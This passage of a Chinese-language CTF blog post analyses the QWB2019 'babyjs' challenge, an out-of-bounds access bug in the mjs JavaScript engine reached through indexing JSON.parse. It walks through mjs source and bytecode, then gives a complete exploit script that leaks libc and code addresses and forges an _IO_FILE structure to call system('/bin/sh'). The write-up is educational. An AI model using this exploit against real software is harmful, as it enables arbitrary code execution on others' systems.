class="string">c:</span><span class="number">233</span>                  <span class="number">34</span>  DUP     </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">117</span>                  <span class="number">35</span>  PUSH_INT    <span class="number">2</span></span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">37</span>  APPEND  </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">38</span>  DUP     </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">117</span>                  <span class="number">39</span>  PUSH_INT    <span class="number">3</span></span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">41</span>  APPEND  </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">213</span>                  <span class="number">42</span>  EXPR        =</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">44</span>  DROP    </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">134</span>                  <span class="number">45</span>  PUSH_STR    [a]</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">48</span>  FIND_SCOPE</span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">49</span>  GET     </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">117</span>                  <span class="number">50</span>  PUSH_INT    <span class="number">0</span></span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">52</span>  SWAP    </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">53</span>  GET     </span><br><span class="line">mjs_util.<span class="string">c:</span><span class="number">233</span>                  <span class="number">54</span>  EXIT</span><br></pre></td></tr></table></figure></p>
+<p>使用PUSH_ARRAY来生成一个array:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> OP_PUSH_ARRAY:</span><br><span class="line">  mjs_push(mjs, mjs_mk_array(mjs));</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p>
+<p>mjs_mk_array函数就是先创建一个obj，然后将他标记为array<code>MJS_TAG_ARRAY</code>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mjs_val_t</span> mjs_mk_array(struct mjs *mjs) &#123;</span><br><span class="line">  <span class="keyword">mjs_val_t</span> ret = mjs_mk_object(mjs);</span><br><span class="line">  <span class="comment">/* change the tag to MJS_TAG_ARRAY */</span></span><br><span class="line">  ret &amp;= ~MJS_TAG_MASK;</span><br><span class="line">  ret |= MJS_TAG_ARRAY;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>向array添加元素使用了字节码APPEND:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> OP_APPEND: &#123;</span><br><span class="line">  <span class="keyword">mjs_val_t</span> val = mjs_pop(mjs);</span><br><span class="line">  <span class="keyword">mjs_val_t</span> arr = mjs_pop(mjs);</span><br><span class="line">  <span class="keyword">mjs_err_t</span> err = mjs_array_push(mjs, arr, val);</span><br><span class="line">  <span class="keyword">if</span> (err != MJS_OK) &#123;</span><br><span class="line">    mjs_set_errorf(mjs, MJS_TYPE_ERROR, <span class="string">"append to non-array"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里调用了mjs_array_push:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mjs_err_t</span> mjs_array_push(struct mjs *mjs, <span class="keyword">mjs_val_t</span> arr, <span class="keyword">mjs_val_t</span> v) &#123;</span><br><span class="line">  <span class="keyword">return</span> mjs_array_set(mjs, arr, mjs_array_length(mjs, arr), v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">mjs_err_t</span> mjs_array_set(struct mjs *mjs, <span class="keyword">mjs_val_t</span> arr, <span class="keyword">unsigned</span> <span class="keyword">long</span> index,</span><br><span class="line">                        <span class="keyword">mjs_val_t</span> v) &#123;</span><br><span class="line">  <span class="keyword">mjs_err_t</span> ret = MJS_OK;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mjs_is_object(arr)) &#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span> n = v_sprintf_s(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"%lu"</span>, index);</span><br><span class="line">    ret = mjs_set(mjs, arr, buf, n, v);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ret = MJS_TYPE_ERROR;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>他只是生成了一个name为idx(idx是字符串类型)的属性，然后value赋值到这个属性里，这里的buf存放的即是字符串类型的idx，然后将其传入mjs_set创建属性添加到这个array中去.</p>
+<p>以idx访问数组使用了OP_GET,会调用到mjs_get_v_proto(mjs, obj, key);以字符串形式遍历属性，不会有越界访问的问题。<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">case</span> OP_GET: &#123;</span><br><span class="line">  <span class="attribute">mjs_val_t</span> obj = mjs_pop(mjs);</span><br><span class="line">  <span class="attribute">mjs_val_t</span> key = mjs_pop(mjs);</span><br><span class="line">  <span class="attribute">mjs_val_t</span> val = MJS_UNDEFINED;</span><br><span class="line"></span><br><span class="line">  <span class="attribute">if</span> (!getprop_builtin(mjs, obj, key, &amp;val)) &#123;</span><br><span class="line">    <span class="attribute">if</span> (mjs_is_object(obj)) &#123;</span><br><span class="line">      <span class="attribute">val</span> = mjs_get_v_proto(mjs, obj, key);</span><br></pre></td></tr></table></figure></p>
+<h3 id="分析poc字节码"><a href="#分析poc字节码" class="headerlink" title="分析poc字节码"></a>分析poc字节码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse[<span class="number">0x123456</span>];</span><br></pre></td></tr></table></figure>
+<p>对应的字节码如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:228</span>                  0   <span class="selector-tag">BCODE_HDR</span>   <span class="selector-attr">[poc.js]</span> <span class="selector-tag">end</span><span class="selector-pseudo">:44</span> <span class="selector-tag">map_offset</span>: 43</span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:134</span>                  20  <span class="selector-tag">PUSH_STR</span>    <span class="selector-attr">[JSON]</span></span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  26  <span class="selector-tag">FIND_SCOPE</span></span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  27  <span class="selector-tag">GET</span>     </span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:134</span>                  28  <span class="selector-tag">PUSH_STR</span>    <span class="selector-attr">[parse]</span></span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  35  <span class="selector-tag">SWAP</span>    </span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  36  <span class="selector-tag">GET</span>     </span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:117</span>                  37  <span class="selector-tag">PUSH_INT</span>    1193046</span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  41  <span class="selector-tag">SWAP</span>    </span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  42  <span class="selector-tag">GET</span></span><br></pre></td></tr></table></figure></p>
+<p>这几步得到parse builtin(mjs_op_json_parse)地址:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:134</span>                  28  <span class="selector-tag">PUSH_STR</span>    <span class="selector-attr">[parse]</span></span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  35  <span class="selector-tag">SWAP</span>    </span><br><span class="line"><span class="selector-tag">mjs_util</span><span class="selector-class">.c</span><span class="selector-pseudo">:233</span>                  36  <span class="selector-tag">GET</span></span><br></pre></td></tr></table></figure></p>
+<p>然后以0x123456为index来越界访问.</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过偏移读取got表项内容，得到libc的基地址，通过读取init_array获取text基地址<br><img src="/2019/09/03/QWB2019-babyjs/4.png" alt=""><br>最终通过伪造_IO_FILE结构体来getshell，详细的操作在参考文章中有.</p>
+<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp:"></a>完整exp:</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">offset</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> a=[];</span><br><span class="line">    <span class="keyword">for</span>( <span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; <span class="number">8</span> ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i] = <span class="built_in">JSON</span>.parse[offset+i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ;i &lt; <span class="number">8</span> ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        res+=a[i]&lt;&lt;(<span class="number">8</span>*i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">offset,target</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span> ; i&lt;<span class="number">8</span> ; i++)&#123;</span><br><span class="line">        <span class="built_in">JSON</span>.parse[offset+i]=(target&gt;&gt;<span class="number">8</span>*i)&amp;<span class="number">0xff</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> start_addr=<span class="number">0x55555556e800</span><span class="number">-0x555555554000</span>;</span><br><span class="line"><span class="keyword">let</span> got_addr=<span class="number">0x00000000022CDF0</span>;</span><br><span class="line"><span class="keyword">let</span> free_got=<span class="number">0x00000000022CE08</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> free_addr=read(free_got-start_addr);</span><br><span class="line"><span class="keyword">let</span> libc_base=free_addr<span class="number">-0x844f0</span>;</span><br><span class="line"><span class="keyword">let</span> code_base=read(<span class="number">0x00000000022CAA8</span>-start_addr)<span class="number">-0x000000000001D40</span>;</span><br><span class="line"><span class="keyword">let</span> system_addr=libc_base+<span class="number">0x45390</span>;</span><br><span class="line"><span class="keyword">let</span> bin_sh_addr=libc_base+<span class="number">0x18cd57</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> cs_log_file=<span class="number">0x00000000022D228</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bss_addr=<span class="number">0x00000000022D218</span>+<span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> _IO_str_jumps=<span class="number">0x3c37a0</span>+libc_base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_file=[</span><br><span class="line"><span class="number">0xfbad1800</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,bin_sh_addr,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ;i &lt; fake_file.length ; i ++)&#123;</span><br><span class="line">    write(bss_addr-start_addr+i*<span class="number">8</span>,fake_file[i]);</span><br><span class="line">&#125;</span><br><span class="line">write(bss_addr-start_addr+<span class="number">0x88</span>,<span class="number">0x7ffff78c6780</span><span class="number">-0x7ffff7500000</span>+libc_base)</span><br><span class="line">fake_file=[_IO_str_jumps<span class="number">-8</span>,<span class="number">0</span>,system_addr];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;fake_file.length;i++)&#123;</span><br><span class="line">    write(bss_addr-start_addr+<span class="number">0xd8</span>+i*<span class="number">8</span>,fake_file[i]);</span><br><span class="line">&#125;</span><br><span class="line">write(cs_log_file-start_addr,bss_addr+code_base);</span><br><span class="line">write(<span class="number">0x00000000022D220</span>-start_addr,<span class="number">999</span>);</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/31/复现近几个月比赛不会做的题/" rel="next" title="复现近几个月比赛不会做的题...">
+                <i class="fa fa-chevron-left"></i> 复现近几个月比赛不会做的题...
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/my.jpg" alt="ditto">
+            
+              <p class="site-author-name" itemprop="name">ditto</p>
+              <p class="site-description motion-element" itemprop="description">pwn for fun</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Dittozzz" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#poc分析"><span class="nav-number">2.</span> <span class="nav-text">poc分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#源码分析"><span class="nav-number">3.</span> <span class="nav-text">源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#mjs对象的构成"><span class="nav-number">3.1.</span> <span class="nav-text">mjs对象的构成:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mjs如何区分各类对象"><span class="nav-number">3.2.</span> <span class="nav-text">mjs如何区分各类对象:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#分析关键代码"><span class="nav-number">3.3.</span> <span class="nav-text">分析关键代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#builtin的实现及漏洞"><span class="nav-number">3.4.</span> <span class="nav-text">builtin的实现及漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#array分析"><span class="nav-number">3.5.</span> <span class="nav-text">array分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析poc字节码"><span class="nav-number">4.</span> <span class="nav-text">分析poc字节码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路"><span class="nav-number">5.</span> <span class="nav-text">利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#完整exp"><span class="nav-number">5.1.</span> <span class="nav-text">完整exp:</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ditto</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">34.5k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
